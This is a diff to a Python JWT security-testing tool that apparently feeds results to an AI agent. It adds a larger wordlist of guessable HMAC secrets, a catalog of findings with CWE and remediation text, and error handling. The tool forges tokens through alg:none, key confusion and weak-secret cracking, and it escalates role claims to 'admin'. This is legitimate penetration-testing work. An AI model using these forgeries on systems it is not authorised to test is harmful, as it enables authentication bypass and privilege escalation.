@@ -7,7 +7,7 @@ that the agent interprets. Validates every attack with 3 baselines to
 avoid false positives (a 200 is NOT evidence of bypass).
 
 Usage:
-    python jwt_tool_handler.py --target URL --token JWT [--output FILE]
+    python jwt_tool_handler.py --target URL --token JWT [--test-endpoint PATH] [--output FILE]
 """
 import argparse
 import base64
@@ -44,6 +44,25 @@ SENSITIVE_NAMES = {
     "private_key", "ssn", "credit_card", "card_number",
 }
 
+# Wordlist por defecto para brute-force de secretos HMAC.
+# Pequeña y rápida: ~40 candidatos cubren los casos comunes en apps de lab
+# (Juice Shop, DVWA, apps de tutorial, defaults de frameworks).
+DEFAULT_WORDLIST = [
+    # Triviales / vacío
+    "", "k", "jwt", "key", "token", "secret", "password", "admin", "test",
+    # Numéricos
+    "123", "1234", "12345", "123456", "1234567", "12345678", "123456789",
+    # Clásicos
+    "password1", "password123", "admin123", "qwerty", "letmein",
+    "changeme", "welcome", "iloveyou", "monkey", "dragon", "master",
+    # JWT-específicos
+    "jwt_secret", "jwtsecret", "jwt-key", "jwtkey", "supersecret",
+    "s3cr3t", "s3cr3t!", "mysecret", "my-secret", "topsecret",
+    "secure", "securekey", "devkey", "development", "production",
+    # Juice Shop
+    "juiceshop", "juice-shop", "juice", "owasp", "bkimminich",
+]
+
 # ---- JWT utilities (stdlib only) ------------------------------------------
 
 def b64d(data):
@@ -66,14 +85,14 @@ def decode_jwt(token):
     }
 
 def find_role_path(payload, path=""):
-    """Recursively find a role-like claim."""
     if isinstance(payload, dict):
         for k, v in payload.items():
             cur = f"{path}.{k}" if path else k
             if k.lower() in ROLE_NAMES and isinstance(v, str):
                 return cur, v
             res = find_role_path(v, cur)
-            if res: return res
+            if res and res[0] is not None:  # ← comprobar que encontró algo
+                return res
     return None, None
 
 def find_sensitive(payload, path=""):
@@ -154,7 +173,6 @@ def validate_attack(target, forged_token, customer_token,
         if r_none["status"] == 200:
             reason = "endpoint_public_no_auth_required"
         else:
-            # Forged token passed where no-auth failed → real bypass
             success = True
             reason = ("auth_bypass_confirmed" if r_cust["status"] != 200
                       else "auth_bypass_both_tokens_accepted")
@@ -199,7 +217,6 @@ def discover_pubkey(base):
 
 def attack_alg_none(endpoint, decoded, customer_token):
     payload = decoded["payload"].copy()
-    # Try to escalate role if present
     role_path, role_val = find_role_path(payload)
     if role_path:
         set_nested(payload, role_path, "admin")
@@ -239,15 +256,13 @@ def attack_key_confusion(endpoint, decoded, customer_token, base):
 
 def attack_weak_secret(endpoint, decoded, customer_token, wordlist=None):
     """Only for HS* algorithms. Brute-force the HMAC secret."""
-    if not wordlist:
-        wordlist = ["secret", "password", "123456", "jwt", "changeme", "key", "admin"]
+    wordlist = wordlist or DEFAULT_WORDLIST
     for guess in wordlist:
         payload = decoded["payload"].copy()
         role_path, _ = find_role_path(payload)
         if role_path:
             set_nested(payload, role_path, "admin")
         forged = forge_hs256(payload, guess.encode())
-        # Cheap test: send and see if 200
         r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
         if r["status"] == 200:
             validation = validate_attack(endpoint, forged, customer_token)
@@ -300,49 +315,244 @@ def analyze_jwt(decoded, token):
         "signature_bytes": len(decoded["signature"]),
     }
 
+# ---- Catálogo enriquecido de hallazgos -----------------------------------
+
+WEAKNESS_CATALOG = {
+    "alg_none_accepted": {
+        "title": "JWT uses 'alg: none' (unsigned token)",
+        "description": (
+            "The JWT header specifies alg=none, meaning the token carries no signature. "
+            "A naive verifier that trusts the 'alg' field will accept any payload as authentic."
+        ),
+        "remediation": (
+            "Enforce a server-side algorithm whitelist (e.g. only RS256). "
+            "Explicitly reject any token whose header contains alg=none."
+        ),
+        "cwe": "CWE-347",
+    },
+    "no_expiration": {
+        "title": "JWT has no 'exp' claim (no expiration)",
+        "description": (
+            "The token does not include an expiration time (exp). Once issued it remains "
+            "valid indefinitely, widening the exploitation window if it leaks or is stolen."
+        ),
+        "remediation": (
+            "Include an 'exp' claim with a short TTL (15–60 minutes for access tokens). "
+            "Pair it with a refresh-token flow to avoid re-login."
+        ),
+        "cwe": "CWE-613",
+    },
+    "no_iss_aud": {
+        "title": "JWT is missing 'iss' / 'aud' claims",
+        "description": (
+            "The token lacks issuer (iss) and audience (aud) claims. A token minted by "
+            "one service can therefore be replayed against another service that shares "
+            "the signing key or trusts the same authorization server."
+        ),
+        "remediation": (
+            "Include and validate 'iss' and 'aud' claims on every token verification. "
+            "Reject tokens whose issuer or audience do not match the expected values."
+        ),
+        "cwe": "CWE-345",
+    },
+    "sensitive_data_in_payload": {
+        "title": "Sensitive data exposed in JWT payload",
+        "description": (
+            "The JWT payload carries fields that should never leave the server: "
+            "password hashes, tokens, API keys or PII. JWT payloads are base64-encoded "
+            "and therefore readable by anyone holding the token."
+        ),
+        "remediation": (
+            "Remove secrets and PII from the token payload. Store only opaque identifiers "
+            "and resolve sensitive data server-side per request."
+        ),
+        "cwe": "CWE-522",
+    },
+    "role_in_payload": {
+        "title": "Authorization role embedded in JWT payload",
+        "description": (
+            "The user role or permission level is stored in the token. If signature "
+            "verification is ever bypassed, the attacker can escalate privileges by "
+            "modifying this field (e.g. role='admin')."
+        ),
+        "remediation": (
+            "Resolve roles server-side from a trusted store per request. If the role must "
+            "live in the token, ensure signature verification cannot be bypassed."
+        ),
+        "cwe": "CWE-639",
+    },
+    "symmetric_algorithm": {
+        "title": "JWT uses symmetric algorithm (HS*)",
+        "description": (
+            "Symmetric algorithms require the same secret for signing and verification. "
+            "A weak or leaked secret lets an attacker forge arbitrary tokens."
+        ),
+        "remediation": (
+            "Prefer asymmetric algorithms (RS256/ES256). If HS* is required, use a "
+            "high-entropy secret (>=256 bits) generated by a CSPRNG and rotate it periodically."
+        ),
+        "cwe": "CWE-326",
+    },
+    "asymmetric_algorithm": {
+        "title": "JWT uses asymmetric algorithm (RS/PS/ES)",
+        "description": (
+            "Asymmetric algorithms are secure when the private key is protected, but if the "
+            "server's public key is discoverable and the algorithm is not pinned per token, "
+            "key-confusion attacks may be possible."
+        ),
+        "remediation": (
+            "Pin the expected algorithm per token and never trust the 'alg' header from "
+            "the token itself. Serve the public key only when required and monitor "
+            "for anomalous verification failures."
+        ),
+        "cwe": "CWE-347",
+    },
+}
+
+
+def _format_baselines(baselines):
+    """Compact human-readable rendering of the 3-baseline validation."""
+    if not baselines:
+        return ""
+    return (
+        f"no_auth={baselines.get('no_auth', {}).get('status')} "
+        f"customer_token={baselines.get('customer', {}).get('status')} "
+        f"forged_token={baselines.get('forged', {}).get('status')} "
+        f"(forged_response_size={baselines.get('forged', {}).get('size')} bytes)"
+    )
+
+
 def consolidate_findings(analysis, attacks, discovery):
     findings = []
-    # From analysis
+
+    # ---------- 1. Findings derived from static analysis ----------
     for w in analysis["weaknesses"]:
+        wid = w["id"]
+        meta = WEAKNESS_CATALOG.get(wid, {})
+
+        # Enriquecer la evidencia según el tipo de debilidad
+        evidence_parts = []
+        if wid == "sensitive_data_in_payload":
+            items = w.get("items", []) or []
+            if items:
+                rendered = ", ".join(
+                    f"{i['path']} ({i['length']} bytes, preview='{i['value_preview']}')"
+                    for i in items[:5]
+                )
+                evidence_parts.append(f"Exposed fields: {rendered}")
+        elif wid == "role_in_payload":
+            evidence_parts.append(
+                f"Role claim '{w.get('path')}' = {w.get('value')!r} in payload"
+            )
+        elif wid == "no_expiration":
+            evidence_parts.append(
+                f"Claims present: {', '.join(analysis.get('claims_present', [])) or '(none)'} | "
+                f"Missing standard claims: {', '.join(analysis.get('claims_missing', []))}"
+            )
+        elif wid == "no_iss_aud":
+            missing = [c for c in ("iss", "aud", "nbf")
+                       if c in analysis.get("claims_missing", [])]
+            evidence_parts.append(
+                f"Missing claims: {', '.join(missing) or 'iss, aud'}"
+            )
+        elif wid in ("symmetric_algorithm", "asymmetric_algorithm"):
+            evidence_parts.append(
+                f"Algorithm: {analysis.get('algorithm')} | "
+                f"family: {analysis.get('algorithm_family')}"
+            )
+
         findings.append({
             "id": f"A07-{len(findings)+1:02d}",
             "severity": w["severity"],
-            "title": w["id"].replace("_", " ").title(),
-            "description": w.get("description", ""),
+            "title": meta.get("title") or wid.replace("_", " ").title(),
+            "description": meta.get("description") or w.get("description", ""),
+            "evidence": " | ".join(evidence_parts),
+            "remediation": meta.get("remediation", ""),
+            "cwe": meta.get("cwe", ""),
+            "owasp": "A07:2025",
             "source": "jwt_analysis",
         })
-    # From attacks
+
+    # ---------- 2. Findings derived from active attacks ----------
     if attacks.get("alg_none", {}).get("success"):
+        baselines = attacks["alg_none"]["validation"]["baselines"]
+        role_mod = attacks["alg_none"].get("role_modified")
         findings.append({
             "id": f"A07-{len(findings)+1:02d}",
             "severity": "CRITICAL",
             "title": "JWT alg:none bypass — authentication completely bypassed",
-            "description": (f"Server accepted unsigned JWT at {discovery['url']} "
-                           "returning HTTP 200 with protected data. Complete auth bypass."),
+            "description": (
+                f"The server accepted an unsigned JWT (alg=none) against the protected "
+                f"endpoint {discovery['url']} and returned the resource. "
+                f"Anyone can forge an authenticated session by setting alg=none."
+            ),
+            "evidence": (
+                f"Endpoint: {discovery['url']} | "
+                f"{_format_baselines(baselines)} | "
+                f"role_modified={role_mod if role_mod else 'none'}"
+            ),
+            "remediation": (
+                "Enforce an algorithm whitelist. Explicitly reject alg=none at token "
+                "verification. Never trust the 'alg' header from the incoming token."
+            ),
+            "cwe": "CWE-347",
+            "owasp": "A07:2025",
             "source": "attack:alg_none",
-            "evidence": {
-                "forged_token": attacks["alg_none"]["forged_token"][:100] + "...",
-                "response_size": attacks["alg_none"]["validation"]["baselines"]["forged"]["size"],
-                "baselines": attacks["alg_none"]["validation"]["baselines"],
-            },
-            "remediation": "Enforce algorithm whitelist. Reject alg=none explicitly.",
         })
+
     if attacks.get("key_confusion", {}).get("success"):
+        baselines = attacks["key_confusion"]["validation"]["baselines"]
+        pub = attacks["key_confusion"].get("pubkey_url")
         findings.append({
             "id": f"A07-{len(findings)+1:02d}",
             "severity": "CRITICAL",
             "title": "JWT key confusion (RS256 → HS256) — signature bypass",
-            "description": "Server accepts HS256 tokens signed with the public key.",
+            "description": (
+                f"The server accepted an HS256 token signed with its own RSA public key "
+                f"(fetched from {pub}). An attacker with the public key can forge "
+                f"arbitrary signed tokens."
+            ),
+            "evidence": (
+                f"Public key source: {pub} | "
+                f"Endpoint: {discovery['url']} | "
+                f"{_format_baselines(baselines)}"
+            ),
+            "remediation": (
+                "Pin the expected algorithm per token. Never derive the HMAC secret "
+                "from an asymmetric public key. Use distinct verification paths for "
+                "RS* and HS* algorithms."
+            ),
+            "cwe": "CWE-347",
+            "owasp": "A07:2025",
             "source": "attack:key_confusion",
-            "remediation": "Pin algorithm per token. Never use RSA pubkey as HMAC secret.",
         })
+
     if attacks.get("weak_secret", {}).get("success"):
+        cracked = attacks["weak_secret"]["cracked_secret"]
+        attempts = attacks["weak_secret"].get("attempts")
         findings.append({
             "id": f"A07-{len(findings)+1:02d}",
             "severity": "CRITICAL",
-            "title": f"Weak HMAC secret cracked: '{attacks['weak_secret']['cracked_secret']}'",
+            "title": "Weak HMAC signing secret recovered via wordlist",
+            "description": (
+                f"The HS* signing secret was recovered from a common wordlist after "
+                f"{attempts} attempts. With the secret, an attacker can forge tokens "
+                f"with arbitrary claims (role, user id, expiration)."
+            ),
+            "evidence": (
+                f"Cracked secret: {cracked!r} | "
+                f"Wordlist size tried: {attempts} | "
+                f"Endpoint: {discovery['url']}"
+            ),
+            "remediation": (
+                "Rotate the signing secret immediately and invalidate existing tokens. "
+                "Generate the new secret with a CSPRNG (>=256 bits)."
+            ),
+            "cwe": "CWE-521",
+            "owasp": "A07:2025",
             "source": "attack:weak_secret",
         })
+
     return findings
 
 # ---- Main orchestrator ----------------------------------------------------
@@ -351,7 +561,6 @@ def run_jwt_attack(target, token, test_endpoint=None):
     decoded = decode_jwt(token)
     analysis = analyze_jwt(decoded, token)
 
-    # Discovery
     if test_endpoint:
         discovery = {"url": target.rstrip("/") + test_endpoint, "source": "provided"}
     else:
@@ -366,7 +575,6 @@ def run_jwt_attack(target, token, test_endpoint=None):
         discovery = {"url": disc["url"], "path": disc["path"],
                      "source": "auto_discovered"}
 
-    # Attacks
     attacks = {}
     attacks["alg_none"] = attack_alg_none(discovery["url"], decoded, token)
 
@@ -415,7 +623,20 @@ def main():
     ap.add_argument("--output", help="Write JSON to file")
     args = ap.parse_args()
 
-    result = run_jwt_attack(args.target, args.token, args.test_endpoint)
+    try:
+        result = run_jwt_attack(args.target, args.token, args.test_endpoint)
+    except Exception as e:
+        # Siempre devolvemos JSON: el agente interpreta el error, no el traceback.
+        result = {
+            "tool": "jwt_tool_handler",
+            "version": "1.0.0",
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "target": args.target,
+            "error": type(e).__name__,
+            "message": str(e),
+            "hint": "Verify that --token is a valid JWT (header.payload.signature).",
+        }
+
     json_str = json.dumps(result, indent=2)
     print(json_str)
     if args.output:
